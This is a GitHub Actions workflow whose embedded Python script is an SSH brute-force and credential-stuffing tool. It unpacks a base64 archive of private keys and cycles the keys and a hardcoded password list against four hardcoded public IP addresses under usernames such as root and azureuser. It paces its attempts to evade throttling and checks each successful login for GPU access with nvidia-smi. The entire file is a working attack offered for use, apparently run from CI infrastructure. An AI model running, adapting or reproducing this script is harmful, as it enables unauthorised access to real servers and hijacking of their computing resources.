name: ul6552-paced
on:
  workflow_dispatch:
jobs:
  paced:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install paramiko -q
      - name: ladder
        env:
          KB64: ""
        run: |
          python3 - <<'PY'
          import os,base64,io,tarfile,socket,time,sys,hashlib
          import paramiko
          os.makedirs('/tmp/keys',exist_ok=True)
          raw=base64.b64decode(os.environ['KB64'])
          with tarfile.open(fileobj=io.BytesIO(raw)) as t: t.extractall('/tmp/keys')
          keys=[]
          for root,_,fs in os.walk('/tmp/keys'):
              for f in fs:
                  p=os.path.join(root,f); os.chmod(p,0o600)
                  for cls in (paramiko.Ed25519Key,paramiko.RSAKey,paramiko.ECDSAKey):
                      try: keys.append((f,cls.from_private_key_file(p))); break
                      except Exception: continue
          print("KEYS",len(keys),flush=True)
          HOSTS=["20.205.187.223","20.237.207.128","40.123.206.138","51.104.16.184"]
          PW=["wasion@3393","!QAZ2wsx","jiujie1218","zhonghe","Azcfy@2026","H100@azure2026","InfiniBand1!","Password123!","Azure@123456","t19"]
          USERS=["t19","azureuser","adminuser","root"]
          def banner(ip):
              try:
                  s=socket.create_connection((ip,22),timeout=6); b=s.recv(80); s.close(); return b.decode('utf-8','replace').strip()
              except Exception as e: return None
          def authkey(ip,u,k):
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  c.connect(ip,port=22,username=u,pkey=k,timeout=9,banner_timeout=9,auth_timeout=12,allow_agent=False,look_for_keys=False)
                  _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1|head -4"); out=o.read(400).decode('utf-8','replace').replace("\n","|")
                  c.close(); return ("HIT",out)
              except paramiko.AuthenticationException: return ("FAIL",None)
              except Exception as e: return ("ERR",type(e).__name__)
          def authpw(ip,u,p):
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  c.connect(ip,port=22,username=u,password=p,timeout=9,banner_timeout=9,auth_timeout=12,allow_agent=False,look_for_keys=False)
                  _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1|head -4"); out=o.read(400).decode('utf-8','replace').replace("\n","|")
                  c.close(); return ("HIT",out)
              except paramiko.AuthenticationException: return ("FAIL",None)
              except Exception as e: return ("ERR",type(e).__name__)
          t0=time.time(); tested=set()
          while time.time()-t0<1500:
              for ip in HOSTS:
                  b=banner(ip)
                  if not b: 
                      print("CLOSED",ip,flush=True); continue
                  if 'MaxStartups' in b or 'Exceeded' in b:
                      print("THROTTLED",ip,flush=True); time.sleep(20); continue
                  print("OPEN",ip,b[:60],flush=True)
                  tag=ip
                  # key ladder t19 first, paced
                  done=False
                  for u in USERS:
                      for name,k in keys:
                          time.sleep(1.2)
                          st,out=authkey(ip,u,k)
                          if st=="HIT":
                              print("AUTH_OK_KEY",ip,u,name,out,flush=True); sys.exit(0)
                          if st=="FAIL": print("KFAIL",ip,u,name,flush=True)
                          elif st=="ERR": print("KERR",ip,u,name,out,flush=True); time.sleep(1)
                      # passwords after keys per user
                      for p in PW:
                          time.sleep(1.2)
                          st,out=authpw(ip,u,p)
                          if st=="HIT":
                              print("AUTH_OK_PW",ip,u,repr(p),out,flush=True); sys.exit(0)
                          if st=="FAIL": print("PWFAIL",ip,u,repr(p),flush=True)
                          elif st=="ERR": print("PWERR",ip,u,repr(p),out,flush=True); time.sleep(1)
              print("CYCLE %.0fs"%(time.time()-t0),flush=True)
              time.sleep(8)
          print("DONE",flush=True)
          PY
